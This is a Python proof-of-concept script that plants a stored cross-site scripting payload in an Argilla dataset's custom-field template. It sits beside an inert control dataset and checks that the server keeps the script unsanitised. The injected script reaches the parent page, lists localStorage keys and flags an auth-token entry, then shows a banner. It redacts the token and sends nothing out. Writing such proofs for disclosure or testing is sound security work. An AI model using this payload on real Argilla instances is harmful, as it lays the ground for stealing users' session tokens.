# make_poc.py -- argilla-io/argilla stored XSS PoC (idx 248, argilla.dom_html_render)
#
# Creates two datasets on a local Argilla v2.8.0 server via the official Python SDK:
#   * xss-poc-positive : CustomField.template carries an active <script> block
#   * xss-poc-negative : CustomField.template carries the same inert HTML, script removed
#
# Both arms are identical in field definitions, questions, records and labels.
# The ONLY difference is whether settings.template contains an active script.

import sys

import argilla as rg

SERVER_URL = "http://localhost:6902"
API_KEY = "argilla.apikey"

FIELD_NAME = "content"
QUESTION_NAME = "quality"
LABELS = ["good", "bad"]

# ---------------------------------------------------------------------------
# Template bodies. Shared inert shell; positive arm adds one <script> block.
# ---------------------------------------------------------------------------

INERT_SHELL = """<div id="poc-wrap" style="font:14px/1.5 monospace;padding:12px;border:1px solid #d0d7de;border-radius:8px">
  <strong>Custom field template (advanced_mode) — {arm} sample</strong>
  <p>Static record body. Field settings, question, records and labels are identical in both arms.</p>
</div>
"""

SCRIPT_BLOCK = """<script>
(function () {
  try {
    var pdoc = parent.document; /* srcdoc iframe without sandbox attr == same-origin parent access */
    var banner = pdoc.createElement('div');
    banner.id = 'xss-poc-banner';
    var lsKeys = [];
    try {
      for (var i = 0; i < pdoc.defaultView.localStorage.length; i++) {
        lsKeys.push(pdoc.defaultView.localStorage.key(i));
      }
    } catch (e) {}
    var tokPresent = lsKeys.some(function (k) { return /token/i.test(k); });
    banner.textContent =
      'XSS PoC FIRED - script from CustomField.template is running; parent.document reachable; ' +
      'localStorage keys visible: ' + lsKeys.length +
      (tokPresent ? ' (auth token entry PRESENT, value redacted)' : '');
    banner.style.cssText =
      'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c62828;color:#fff;' +
      'font:14px/1.4 monospace;padding:12px 16px;text-align:center;';
    pdoc.body.appendChild(banner);
    pdoc.title = '[XSS PoC] ' + pdoc.title;
  } catch (e) {
    /* a sandboxed iframe without allow-same-origin would land here */
  }
})();
</script>
"""

MALICIOUS_TEMPLATE = INERT_SHELL.format(arm="POSITIVE (malicious)") + SCRIPT_BLOCK
INERT_TEMPLATE = INERT_SHELL.format(arm="NEGATIVE (inert control)")


def build_dataset(client: rg.Argilla, name: str, template: str) -> rg.Dataset:
    settings = rg.Settings(
        fields=[
            rg.CustomField(
                name=FIELD_NAME,
                title="Custom HTML field",
                template=template,
                advanced_mode=True,
            )
        ],
        questions=[rg.LabelQuestion(name=QUESTION_NAME, title="Quality", labels=LABELS)],
    )

    dataset = rg.Dataset(name=name, settings=settings)
    dataset.create()

    dataset.records.log(
        [
            {
                FIELD_NAME: {"value": "Static record body text, identical in both arms."},
            }
        ]
    )

    # argilla 2.8.0 SDK has no publish() helper; use the REST endpoint directly.
    response = client.http_client.put(f"/api/v1/datasets/{dataset.id}/publish")
    if response.status_code not in (200, 422):  # 422 == "already published" on re-run
        response.raise_for_status()
    return dataset


def main() -> int:
    client = rg.Argilla(SERVER_URL, api_key=API_KEY)

    print("connected:", SERVER_URL)
    print("whoami:", client.me.username, "role:", client.me.role)

    for existing in ("xss-poc248-positive", "xss-poc248-negative"):
        old = client.datasets(existing)
        if old is not None:
            print("deleting stale dataset:", existing)
            old.delete()

    positive = build_dataset(client, "xss-poc248-positive", MALICIOUS_TEMPLATE)
    print("created dataset:", positive.name, "(id=%s)" % positive.id)

    negative = build_dataset(client, "xss-poc248-negative", INERT_TEMPLATE)
    print("created dataset:", negative.name, "(id=%s)" % negative.id)

    # Show what the server round-trips back for the positive arm: the raw
    # template string is persisted verbatim, no sanitisation happens server-side.
    stored = client.datasets("xss-poc248-positive")
    template_back = stored.settings.fields[0].template
    print("---stored template as returned by the API (verbatim) ---")
    print(template_back)
    print("------------------------------------------------------")
    print("stored template length: %d chars" % len(template_back))
    print("script present in stored template:", "<script>" in template_back)

    print("OK: both datasets created and published")
    return 0


if __name__ == "__main__":
    sys.exit(main())
